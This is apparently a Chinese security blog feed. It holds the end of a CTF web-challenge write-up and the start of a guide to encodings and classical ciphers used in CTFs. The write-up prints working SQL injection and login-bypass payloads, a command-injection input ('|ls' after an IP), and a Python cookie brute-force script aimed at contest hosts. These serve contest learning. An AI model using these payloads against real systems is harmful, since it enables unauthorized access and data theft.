<h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开解题链接，可以看到4个超链接，然后就没有然后了。。。</p>
<p>一个一个访问看看。。。。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8720.png" alt=""></p>
<p>考过3级（没考过）的渣渣表示看不懂</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png" alt=""></p>
<p>其他链接也是如此，就只有一句英文的名言(看起来似乎是名言… 我也不知道是不是，知道的告诉我下…，先谢谢了…)。。。。</p>
<p>抓包也没看到什么可疑的东西</p>
<p>再看看题目提示吧，没准就有就用。。。</p>
<p>标题是文件包含，也说了flag的位置。。。</p>
<p>再回来看看前面的4个超链接</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8722.png" alt=""></p>
<p>这种url形式的，看起来有点像是文件包含，直接修改page值为/flag 看看</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8723.png" alt=""></p>
<p>居然不在这里。。。提示又说在/flag ，可以试试多加几个../../../../../试试~~~~</p>
<p>不过在这之前还是先查看源码和响应包吧….</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8724.png" alt=""></p>
<p>有注释。。。</p>
<p>访问这个页面。。。得到flag。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8725.png" alt=""></p>
<h4 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag"></a>Flag</h4><p>flag{F11elNcLud3Get}</p>
<h3 id="简单的验证"><a href="#简单的验证" class="headerlink" title="简单的验证"></a>简单的验证</h3><h4 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h4><p>简单的验证<br>描述：你不是amdin，没有权限查看flag<br><a href="http://218.76.35.75:20127" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>和题目5差不多，把cookie里面user改成admin之后，爆破guess值，最后是573<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line"></div><div class="line">url=&quot;http://218.76.35.75:20127/index.php&quot;</div><div class="line">for i in xrange(1000,0,-1):</div><div class="line"></div><div class="line">    header=&#123;&quot;Cookie&quot;:&quot;user=admin;guess=&quot;+str(i)&#125;</div><div class="line"></div><div class="line">    print header</div><div class="line"></div><div class="line">    result=r.get(url,headers=header)</div><div class="line"></div><div class="line">    content=result.content</div><div class="line"></div><div class="line">    if &apos;flag&apos; in content or &apos;Flag&apos; in content or &apos;FLAG&apos; in content:</div><div class="line"></div><div class="line">        print content</div><div class="line"></div><div class="line">        print i</div><div class="line"></div><div class="line">        break</div></pre></td></tr></table></figure></p>
<p>运行结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8726.png" alt=""></p>
<h4 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag"></a>Flag</h4><p>flag{EaSy70Ch1ngG00kie}</p>
<h3 id="注入那么简单"><a href="#注入那么简单" class="headerlink" title="注入那么简单"></a>注入那么简单</h3><h4 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h4><p>注入那么简单<br>描述：注入、猜表、拿分，就是这么简单<br><a href="http://218.76.35.75:20101" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目要求是注入，可输入的参数为name </p>
<p>首先尝试name=guest 存在返回。</p>
<p>再次尝试name=guest’or’1’=’1,返回3列，说明没有做过多的过滤，这里，我们尝试用order by 来获得列。</p>
<p>Name=guest’order by 1 %23 有返回，依次递增数字到4时报错，说明有3列。</p>
<p>题目提示，说要猜表，构造如下语句，来获得flag</p>
<p><a href="http://218.76.35.75:20101/?name=guest%27union%20select%201,flag,3%20from%20flag%23" target="_blank" rel="external">http://218.76.35.75:20101/?name=guest%27union%20select%201,flag,3%20from%20flag%23</a></p>
<h4 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag"></a>Flag</h4><p>flag{thisisforunionsqlinjection}</p>
<h3 id="你能进来么"><a href="#你能进来么" class="headerlink" title="你能进来么"></a>你能进来么</h3><h4 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h4><p>你能进来么<br>描述：图片上传功能真的好强大<br><a href="http://218.76.35.75:20103" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>上传一个图片马直接拿到flag</p>
<h4 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag"></a>Flag</h4><p>flag{uploadwithinclude}</p>
<h3 id="好简单的题目"><a href="#好简单的题目" class="headerlink" title="好简单的题目"></a>好简单的题目</h3><h4 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h4><p>好简单的题目<br>描述：我要dir溢出你，信不信<br><a href="http://218.76.35.75:20105" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>这个题目，原本就是一个不可能的命题，谁都不可能dir命令能溢出服务器，猜测出题者考察命令执行，并且，页面上也为目标Ip的输入，我们输入127.0.0.1 返回Ping的结果</p>
<p>猜测，目标IP后面可以加上连接符，执行多条语句。</p>
<p>这里有个小小的障碍，linux下的连接符有多个。如&amp;&amp;,||,;,| 我们需要都测试后面命令为简单的ls 即可</p>
<p>127.0.0.1111|ls</p>
<p>可以看到有md5字符串返回。猜测为文件夹。<br><a href="http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/" target="_blank" rel="external">http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/</a><br>访问即可获得flag</p>
<h4 id="Flag-13"><a href="#Flag-13" class="headerlink" title="Flag"></a>Flag</h4><p>flag{dirpwnitdoyouknow}</p>
<h3 id="没那么简单"><a href="#没那么简单" class="headerlink" title="没那么简单"></a>没那么简单</h3><h4 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h4><p>没那么简单<br>（50位解决者）<br>描述：我认为这是一个sql注入，你发现了吗<br><a href="http://218.76.35.75:20108" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>发现存在robots.txt 文件</p>
<p>访问该地址。得到upload.zip</p>
<p>Upload.zip为index.php</p>
<p>查看Index.php后。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8727.png" alt=""></p>
<p>发现对大多数的字符进行了过滤。该过滤方式为黑名单判断，我们只需要找到程序中，为过滤完全的字符，进行payload编写即可。</p>
<p>查找wooyun或者其他地方的资料库，可以知道.%0a 同样可以用来做空格的代替。</p>
<p>那么我们只需要构造如下参数提交</p>
<p>username=admind’%a0union%a0select%a0’4124bc0a9335c27f086f24ba207a4912’%a0from%a0admin%a0where%a0’1’=’1&amp;password=aa<br>即可得到flag</p>
<h4 id="Flag-14"><a href="#Flag-14" class="headerlink" title="Flag"></a>Flag</h4><p>flag{robotsfilehassomehappything}</p>
<h3 id="有趣的注入"><a href="#有趣的注入" class="headerlink" title="有趣的注入"></a>有趣的注入</h3><h4 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h4><p>有趣的注入<br>描述：在渗透测试中，任何细节都不能错过。sql注入是渗透测试中最常使用的攻击技术。这里有一个简单的网站，请帮忙找到flag。<br><a href="http://218.76.35.75:20116" target="_blank" rel="external">题目链接</a></p>
<h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>1.文件包含（需要开一下脑洞，猜一猜文件名）</p>
<p>根据提示，可以得到一个目录：</p>
<p><a href="http://218.76.35.75:20116/flagishere/" target="_blank" rel="external">http://218.76.35.75:20116/flagishere/</a><br>2.访问这个目录，是一个登录界面，这道题目考的是注入，只不过考点是sql注入的绕过。后端代码中检测了并且拦截了各种sql的关键字。</p>
<p>但是，可以使用“||”来代替关键词 OR</p>
<p>用户名和密码输入admin’||’1’=’1即可绕过检测登录，获得flag</p>
<h4 id="Flag-15"><a href="#Flag-15" class="headerlink" title="Flag"></a>Flag</h4><p>flag{s0_e4sy<em>sq1i</em>:)}</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这次CTF的Writeup，有的解题思路是题目给出的，一部分是自己的想法。自己的水平还是有些不够吧！这里只写了一些题目的Writeup，有的题目的链接已经失效了。<br>有的题目是真的不知道做，思路也看不大懂。就这样吧，后面如果可以的话，再更新吧！</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CTF中那些脑洞大开的编码和加密]]></title>
      <url>http://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="CTF中那些脑洞大开的编码和加密"><a href="#CTF中那些脑洞大开的编码和加密" class="headerlink" title="CTF中那些脑洞大开的编码和加密"></a>CTF中那些脑洞大开的编码和加密</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:表哥，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。本来是想尽快写出参考的文章，无奈期间被各种事情耽搁导致文章断断续续写了2个月，文章肯定有许多没有提及到，欢迎小伙伴补充，总之，希望对小伙伴们有帮助吧！</p>
<h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">常见编码:</div><div class="line">    1.ASCII编码</div><div class="line">    2.Base64/32/16编码</div><div class="line">    3.shellcode编码</div><div class="line">    4.Quoted-printable编码</div><div class="line">    5.XXencode编码</div><div class="line">    6.UUencode编码</div><div class="line">    7.URL编码</div><div class="line">    8.Unicode编码</div><div class="line">    9.Escape/Unescape编码</div><div class="line">    10.HTML实体编码</div><div class="line">    11.敲击码(Tap code)</div><div class="line">    12.莫尔斯电码(Morse Code)</div><div class="line">    13.编码的故事</div><div class="line"> </div><div class="line">各种文本加密</div><div class="line"> </div><div class="line">换位加密:</div><div class="line">    1.栅栏密码(Rail-fence Cipher)</div><div class="line">    2.曲路密码(Curve Cipher)</div><div class="line">    3.列移位密码(Columnar Transposition Cipher)</div><div class="line">     </div><div class="line">替换加密:</div><div class="line">    1.埃特巴什码(Atbash Cipher)</div><div class="line">    2.凯撒密码(Caesar Cipher)</div><div class="line">    3.ROT5/13/18/47</div><div class="line">    4.简单换位密码(Simple Substitution Cipher)</div><div class="line">    5.希尔密码(Hill Cipher)</div><div class="line">    6.猪圈密码(Pigpen Cipher)</div><div class="line">    7.波利比奥斯方阵密码（Polybius Square Cipher)</div><div class="line">    8.夏多密码(曲折加密)</div><div class="line">    9.普莱菲尔密码(Playfair Cipher)</div><div class="line">    10.维吉尼亚密码(Vigenère Cipher)</div><div class="line">    11.自动密钥密码(Autokey Cipher)</div><div class="line">    12.博福特密码(Beaufort Cipher)</div><div class="line">    13.滚动密钥密码(Running Key Cipher)</div><div class="line">    14.Porta密码(Porta Cipher)</div><div class="line">    15.同音替换密码(Homophonic Substitution Cipher)</div><div class="line">    16.仿射密码(Affine Cipher)</div><div class="line">    17.培根密码(Baconian Cipher)</div><div class="line">    18.ADFGX和ADFGVX密码(ADFG/VX Cipher)</div><div class="line">    19.双密码(Bifid Cipher)</div><div class="line">    20.三分密码(Trifid Cipher)</div><div class="line">    21.四方密码(Four-Square Cipher)</div><div class="line">    22.棋盘密码（Checkerboard Cipher)</div><div class="line">    23.跨棋盘密码(Straddle Checkerboard Cipher)</div><div class="line">    24.分组摩尔斯替换密码(Fractionated Morse Cipher)</div><div class="line">    25.Bazeries密码(Bazeries Cipher)</div><div class="line">    26.Digrafid密码(Digrafid Cipher)</div><div class="line">    27.格朗普雷密码(Grandpré Cipher)</div><div class="line">    28.比尔密码(Beale ciphers)</div><div class="line">    29.键盘密码(Keyboard Cipher)</div><div class="line"> </div><div class="line">其他有趣的机械密码:</div><div class="line">    1.恩尼格玛密码</div><div class="line"> </div><div class="line">代码混淆加密:</div><div class="line">    1.asp混淆加密</div><div class="line">    2.php混淆加密</div><div class="line">    3.css/js混淆加密</div><div class="line">    4.VBScript.Encode混淆加密</div><div class="line">    5.ppencode</div><div class="line">    6.rrencode</div><div class="line">    7.jjencode/aaencode</div><div class="line">    8.JSfuck</div><div class="line">    9.jother</div><div class="line">    10.brainfuck编程语言</div><div class="line"> </div><div class="line">相关工具</div><div class="line"> </div><div class="line">参考网站</div></pre></td></tr></table></figure>
<h2 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h2><h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><h4 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1.ASCII编码"></a>1.ASCII编码</h4><p>ASCII编码大致可以分作三部分组成：</p>
<p>第一部分是：ASCII非打印控制字符（参详ASCII码表中0-31）;</p>
<p>第二部分是：ASCII打印字符，也就是CTF中常用到的转换;</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3796563179.jpg" alt="ASCII.jpg"></p>
<p>第三部分是：扩展ASCII打印字符(第一第三部分详见<a href="http://www.asciima.com/" target="_blank" rel="external">ASCII码表</a>解释)。</p>
<p>编码转换示例</p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3369091416.png" alt="小葵.png"></p>
<p>ASCII编码对应十进制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103</div></pre></td></tr></table></figure>
<p>对应可以转换成二进制，八进制，十六进制等。</p>
<hr>
<h4 id="2-Base64-32-16编码"><a href="#2-Base64-32-16编码" class="headerlink" title="2.Base64/32/16编码"></a>2.Base64/32/16编码</h4><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。</p>
<p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2533169055.png" alt="base64字母表.png"></p>
<p>举个例子(base64)：</p>
<blockquote>
<p>源文本：T   h   e</p>
<p>对应ascii码:84 104 101</p>
<p>8位binary：01010100 01101000 01100101</p>
<p>6位binary：010101 000110 100001 100101</p>
<p>高位补0：000010101 00000110 00100001 00100101</p>
<p>对应ascii码：21   6   33   37</p>
<p>查表：V  G  h  l</p>
</blockquote>
<p>利用Python base64模块，我们分别可以这样加密解密base64 32 16：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1167712558.png" alt="python加解base64.png"></p>
<hr>
<h4 id="3-shellcode编码"><a href="#3-shellcode编码" class="headerlink" title="3.shellcode编码"></a>3.shellcode编码</h4><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</div></pre></td></tr></table></figure>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3876383071.png" alt="shellcode.png"></p>
<hr>
<h4 id="4-Quoted-printable-编码"><a href="#4-Quoted-printable-编码" class="headerlink" title="4.Quoted-printable 编码"></a>4.Quoted-printable 编码</h4><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码，编码原理<a href="http://blog.chacuo.net/494.html" target="_blank" rel="external">参考</a>。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/27890106.png" alt="Quoted-printable 编码.png"></p>
<p>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p>
<p>编码后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7=8B=90=E7=8B=B8=E8=B7=B3=E8</div><div class="line">=BF=87=E4=BA=86=E6=87=92=E6=83=B0=E7=9A=84=E7=8B=97</div></pre></td></tr></table></figure>
<p>编码解码<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="external">链接</a></p>
<hr>
<h4 id="5-XXencode编码"><a href="#5-XXencode编码" class="headerlink" title="5.XXencode编码"></a>5.XXencode编码</h4><p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3058863885.png" alt="XXencode.png"></p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：<code>hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</code></p>
<p>编码解码<a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="external">链接</a></p>
<hr>
<h4 id="6-UUencode编码"><a href="#6-UUencode编码" class="headerlink" title="6.UUencode编码"></a>6.UUencode编码</h4><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：<code>M5&amp;amp;AE(&#39;%U:6-K(&amp;amp;)R;W=N(&amp;amp;9O&amp;gt;&quot;!J=6UP&amp;lt;R!O=F5R(&#39;1H92!L87IY(&amp;amp;1O9PH*</code></p>
<p>编码解码<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="external">链接</a></p>
<hr>
<h4 id="7-URL编码"><a href="#7-URL编码" class="headerlink" title="7.URL编码"></a>7.URL编码</h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p>
<p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>编码后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</div></pre></td></tr></table></figure>
<p>编码解码<a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="external">链接</a></p>
<hr>
<h4 id="8-Unicode编码"><a href="#8-Unicode编码" class="headerlink" title="8.Unicode编码"></a>8.Unicode编码</h4><p>Unicode编码有以下四种编码方式：</p>
<p>源文本：<code>The</code></p>
<p>&amp;#x [Hex]：<code>&amp;amp;#x0054;&amp;amp;#x0068;&amp;amp;#x0065;</code></p>
<p>&amp;# [Decimal]：<code>&amp;amp;#00084;&amp;amp;#00104;&amp;amp;#00101;</code></p>
<p>\U [Hex]：<code>\U0054\U0068\U0065</code></p>
<p>\U+ [Hex]：<code>\U+0054\U+0068\U+0065</code></p>
<p>编码解码<a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="external">链接</a></p>
<hr>
<h4 id="9-Escape-Unescape编码"><a href="#9-Escape-Unescape编码" class="headerlink" title="9.Escape/Unescape编码"></a>9.Escape/Unescape编码</h4><p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p>
<p>源文本：<code>The</code></p>
<p>编码后：<code>%u0054%u0068%u0065</code></p>
<hr>
<h4 id="10-HTML实体编码"><a href="#10-HTML实体编码" class="headerlink" title="10.HTML实体编码"></a>10.HTML实体编码</h4><p><img src="https://www.hackfun.org/usr/uploads/2016/07/299609014.png" alt="html实体编码.png"></p>
<p>完整编码手册<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="external">参考</a></p>
<hr>
<h4 id="11-敲击码"><a href="#11-敲击码" class="headerlink" title="11.敲击码"></a>11.敲击码</h4><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p>
<p>敲击码表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">  1  2  3  4  5</div><div class="line">1 A  B C/K D  E</div><div class="line">2 F  G  H  I  J </div><div class="line">3 L  M  N  O  P</div><div class="line">4 Q  R  S  T  U</div><div class="line">5 V  W  X  Y  Z</div></pre></td></tr></table></figure>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/1657370061.jpg" alt="敲击码.jpg"></p>
<hr>
<h4 id="12-莫尔斯电码"><a href="#12-莫尔斯电码" class="headerlink" title="12.莫尔斯电码"></a>12.莫尔斯电码</h4><p>摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p>
<ol>
<li>点（.）</li>
<li>划（-）</li>
<li>每个字符间短的停顿（通常用空格表示停顿）</li>
<li>每个词之间中等的停顿（通常用<code>/</code>划分）</li>
<li>以及句子之间长的停顿</li>
</ol>
<p>摩尔斯电码字母和数字对应表：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE%E6%9C%AA%E5%91%BD%E5%90%8D.png" alt=""></p>
<p>源文本:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>编码后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">- .... . / --.- ..- .. -.-. -.- / -... .-. --- .-- -. / ..-. --- -..- / .--- ..- -- .--. ... / --- ...- . .-. / - .... . / .-.. .- --.. -.-- / -.. --- --.</div></pre></td></tr></table></figure>
<p>在线编码解码<a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="external">传送门</a></p>
<p>摩尔斯电码除了能对字母数字编码以外还对一些标点符号，非英语字符进行了编码，而且还有一些特定意义的组合称为特殊符号，比如<code>·-·-·-·-·-</code>表达的意思是调用信号，表示“我有消息发送”。如果你感兴趣可以参考<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81" target="_blank" rel="external">WiKi</a>。</p>
<hr>
<h4 id="13-编码的故事"><a href="#13-编码的故事" class="headerlink" title="13.编码的故事"></a>13.编码的故事</h4><p>推荐大家去看<a href="http://wenku.baidu.com/link?url=kTrscV5j5AsZq5zvBpr2jdkEJW8LqgrkkKsddwWA3YlXmgeqh_be95nMxqbFPOYoVBVy3A6lutlcXVDYLdZ-3iRawJpc0VZ71as07FnxtGS" target="_blank" rel="external">编码的故事</a>一文。</p>
<hr>
<h3 id="各种文本加密"><a href="#各种文本加密" class="headerlink" title="各种文本加密"></a>各种文本加密</h3><p>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。</p>
<p>加密示例：</p>
<p>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/997899652.png" alt="文本加密.png"></p>
<p>编码解码<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="external">链接</a></p>
<hr>
<h3 id="换位加密"><a href="#换位加密" class="headerlink" title="换位加密"></a>换位加密</h3><h4 id="1-栅栏密码"><a href="#1-栅栏密码" class="headerlink" title="1.栅栏密码"></a>1.栅栏密码</h4><p><strong>（1）介绍</strong></p>
<p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。</p>
<p>明文：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>去空格：<code>Thequickbrownfoxjumpsoverthelazydog</code></p>
<p>分组：<code>Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</code></p>
<p>第一组：<code>Teucbonojmsvrhlzdg</code></p>
<p>第二组：<code>hqikrwfxupoeteayo</code></p>
<p>密文：<code>Teucbonojmsvrhlzdghqikrwfxupoeteayo</code></p>
<p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="2-曲路密码"><a href="#2-曲路密码" class="headerlink" title="2.曲路密码"></a>2.曲路密码</h4><p>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是曲路路径)。</p>
<p>明文：<code>The quick brown fox jumps over the lazy dog</code></p>
<p>填入5行7列表(事先约定填充的行列数)</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2848330636.png" alt="曲路密码表.png"></p>
<p>加密的回路线(事先约定填充的行列数)</p>
